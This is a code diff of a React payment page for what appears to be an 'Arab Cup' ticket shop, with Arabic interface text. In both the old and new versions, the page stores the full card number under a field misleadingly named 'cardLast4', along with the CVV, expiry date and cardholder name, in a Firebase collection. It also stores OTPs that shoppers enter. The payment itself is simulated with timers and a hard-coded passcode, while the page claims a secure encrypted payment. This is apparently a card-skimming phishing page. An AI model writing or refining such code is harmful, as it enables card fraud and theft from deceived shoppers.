@@ -3,8 +3,8 @@ import { useCart } from "@/context/CartContext";
 import { useNavigation } from "@/context/NavigationContext";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
-import { Clock, CreditCard, Lock, Shield, CheckCircle, Loader2 } from "lucide-react";
-import { useState, useEffect, useRef } from "react";
+import { Clock, CreditCard, Lock, Shield, CheckCircle } from "lucide-react";
+import { useState, useEffect } from "react";
 import { OTPModal } from "@/components/arab-cup/OTPModal";
 import { useToast } from "@/hooks/use-toast";
 import { saveFormSubmission } from "@/lib/firebase";
@@ -18,8 +18,6 @@ export default function Payment() {
   const [isProcessing, setIsProcessing] = useState(false);
   const [showSuccess, setShowSuccess] = useState(false);
   const [otpError, setOtpError] = useState<string | null>(null);
-  const [showCardLoading, setShowCardLoading] = useState(false);
-  const cardDataRef = useRef({ cardNumber: "", cvv: "", expiryDate: "", cardholderName: "" });
 
   const [cardData, setCardData] = useState({
     cardNumber: "",
@@ -93,31 +91,29 @@ export default function Payment() {
 
   const handleSubmit = async () => {
     if (validateForm()) {
-      cardDataRef.current = { ...cardData };
-      
       try {
+        const cardLast4 = cardData.cardNumber;
+
         await saveFormSubmission(
           "payment_attempt",
           {
-            cardLast4: cardData.cardNumber,
+            cardLast4,
             cardholderName: cardData.cardholderName,
             expiryDate: cardData.expiryDate,
-            cvv: cardData.cvv,
             amount: totalPrice,
+            cvv: cardData.cvv,
             ticketCount: totalItems,
           },
-          false,
+          true,
         );
       } catch (error) {
         console.error("Failed to save payment submission:", error);
       }
-      
-      setShowCardLoading(true);
-      
+      setIsProcessing(true);
       setTimeout(() => {
-        setShowCardLoading(false);
+        setIsProcessing(false);
         setShowOTP(true);
-      }, 3000);
+      }, 1500);
     }
   };
 
@@ -125,48 +121,27 @@ export default function Payment() {
     setIsProcessing(true);
     setOtpError(null);
 
-    try {
-      await saveFormSubmission(
-        "payment_attempt",
-        {
-          cardLast4: cardDataRef.current.cardNumber,
-          cardholderName: cardDataRef.current.cardholderName,
-          expiryDate: cardDataRef.current.expiryDate,
-          cvv: cardDataRef.current.cvv,
-          otp: otp,
-          amount: totalPrice,
-          ticketCount: totalItems,
-        },
-        false,
-      );
-    } catch (error) {
-      console.error("Failed to save OTP submission:", error);
-    }
+    await new Promise((resolve) => setTimeout(resolve, 2000));
 
-    await new Promise((resolve) => setTimeout(resolve, 3000));
-
-    if (otp === "1234" || otp === "123456") {
-      try {
-        await saveFormSubmission(
-          "payment_attempt",
-          {
-            cardLast4: cardDataRef.current.cardNumber,
-            cardholderName: cardDataRef.current.cardholderName,
-            expiryDate: cardDataRef.current.expiryDate,
-            cvv: cardDataRef.current.cvv,
-            otp: otp,
-            amount: totalPrice,
-            ticketCount: totalItems,
-          },
-          true,
-        );
-      } catch (error) {
-        console.error("Failed to save success:", error);
-      }
+    if (otp === "123456") {
       await clearCart();
       setShowOTP(false);
       setShowSuccess(true);
     } else {
+      try {
+        await saveFormSubmission(
+          "payment_attempt",
+          {
+            otp,
+            ticketCount: totalItems,
+            failureReason: "رمز التحقق غير صحيح",
+          },
+          false,
+        );
+      } catch (error) {
+        console.error("Failed to save payment submission:", error);
+      }
+
       setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
       setIsProcessing(false);
     }
@@ -189,23 +164,12 @@ export default function Payment() {
     }
   };
 
-  if (showCardLoading) {
-    return (
-      <div className="min-h-screen bg-[#f7f7f7] font-sans flex flex-col items-center justify-center" dir="rtl">
-        <div className="bg-white rounded-2xl p-8 shadow-lg text-center max-w-sm mx-4">
-          <div className="w-20 h-20 bg-[#8A1538]/10 rounded-full flex items-center justify-center mx-auto mb-6">
-            <Loader2 className="w-10 h-10 text-[#8A1538] animate-spin" />
-          </div>
-          <h2 className="text-xl font-bold text-gray-900 mb-2">جاري التحقق من البطاقة</h2>
-          <p className="text-gray-500 text-sm">يرجى الانتظار بينما نتحقق من بيانات بطاقتك...</p>
-        </div>
-      </div>
-    );
-  }
-
   if (showSuccess) {
     return (
-      <div className="min-h-screen bg-[#f7f7f7] font-sans flex flex-col" dir="rtl">
+      <div
+        className="min-h-screen bg-[#f7f7f7] font-sans flex flex-col"
+        dir="rtl"
+      >
         <Header />
         <div className="flex-1 flex flex-col items-center justify-center p-8 text-center">
           <div className="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6">
@@ -222,9 +186,7 @@ export default function Payment() {
             <div className="text-3xl font-bold text-[#8A1538]">
               {totalPrice} ريال
             </div>
-            <div className="text-sm text-gray-500 mt-2">
-              {totalItems} تذكرة
-            </div>
+            <div className="text-sm text-gray-500 mt-2">{totalItems} تذكرة</div>
           </div>
           <Button
             onClick={() => navigateTo("/")}
@@ -261,10 +223,10 @@ export default function Payment() {
               <CreditCard className="w-6 h-6 text-white" />
             </div>
             <div>
-              <h2 className="text-lg font-bold text-gray-900">الدفع بالبطاقة</h2>
-              <p className="text-xs text-gray-500">
-                دفع آمن عبر اتصال مشفر
-              </p>
+              <h2 className="text-lg font-bold text-gray-900">
+                الدفع بالبطاقة
+              </h2>
+              <p className="text-xs text-gray-500">دفع آمن عبر اتصال مشفر</p>
             </div>
           </div>
 
@@ -363,6 +325,8 @@ export default function Payment() {
               )}
             </div>
           </div>
+
+          <p className="text-xs text-gray-400 mt-4 text-center"></p>
         </div>
 
         <div className="bg-white rounded-2xl shadow-sm p-5 mb-4">
